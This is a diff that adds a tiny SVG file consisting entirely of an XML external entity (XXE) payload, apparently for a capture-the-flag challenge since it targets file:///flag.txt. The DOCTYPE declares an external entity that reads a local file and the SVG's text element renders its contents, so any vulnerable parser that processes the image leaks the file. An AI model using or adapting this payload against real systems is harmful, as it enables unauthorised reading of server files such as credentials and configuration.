@@ -1,0 +1,6 @@
+<!DOCTYPE svg [
+  <!ENTITY sensitiveFile SYSTEM "file:///flag.txt">
+]>
+<svg>
+  <text>&sensitiveFile;</text>
+</svg>
